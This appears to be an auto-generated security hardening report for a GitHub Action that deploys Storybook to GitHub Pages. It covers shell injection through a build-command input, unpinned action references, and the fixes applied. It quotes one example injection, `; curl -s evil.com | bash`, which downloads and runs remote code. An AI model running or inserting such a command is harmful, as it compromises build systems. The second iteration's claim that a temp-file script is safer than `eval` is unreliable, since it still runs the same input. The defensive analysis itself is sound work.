<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in the 'Build' step directly interpolates `${{ inputs.build_command }}` as a shell command. Because GitHub Actions performs template substitution before the shell executes the script, an attacker who controls the `build_command` input can inject arbitrary shell commands (e.g., `; curl -s evil.com | bash`). The expression must never appear directly inside a `run:` block; instead, pass it via an `env:` variable and invoke it safely.

Locations:

- `action.yaml:40`

### unpinned-uses (severity: high)

Three `uses:` references in action.yaml are pinned to mutable tags or version strings rather than immutable 40-character commit SHAs. This exposes the action to supply-chain attacks if the upstream tag is moved or the repository is compromised. Failing references:
- `actions/checkout@v3` (line 33)
- `actions/upload-pages-artifact@v1.0.4` (line 44)
- `actions/deploy-pages@v1` (line 50)
Each should be replaced with its corresponding full SHA, e.g. `actions/checkout@<40-char-sha> # v3`.

Locations:

- `action.yaml:33`
- `action.yaml:44`
- `action.yaml:50`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:41`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, unpinned-uses, static-inline-injection

**Notes:**

Fixed action.yaml: (1) Moved ${{ inputs.build_command }} from the run: block into an env: variable (BUILD_COMMAND) and invoked it via `eval "$BUILD_COMMAND"` to prevent shell injection. (2) Pinned all three uses: references to immutable 40-char commit SHAs: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3, actions/upload-pages-artifact@a597aecd27af1cf14095ccaa29169358e3d91e28 # v1.0.4, actions/deploy-pages@f27bcc15848fdcdcc02f01754eb838e44bcf389b # v1.

### Iteration 2

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `eval "$BUILD_COMMAND"` with a temp-file approach: the build command is written to a temporary script file via `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and then executed with `bash "$_build_script"`. This eliminates the dangerous `eval` builtin while preserving the ability to run the caller-specified build command. The `BUILD_COMMAND` env var indirection was already in place; only the execution method needed to change.

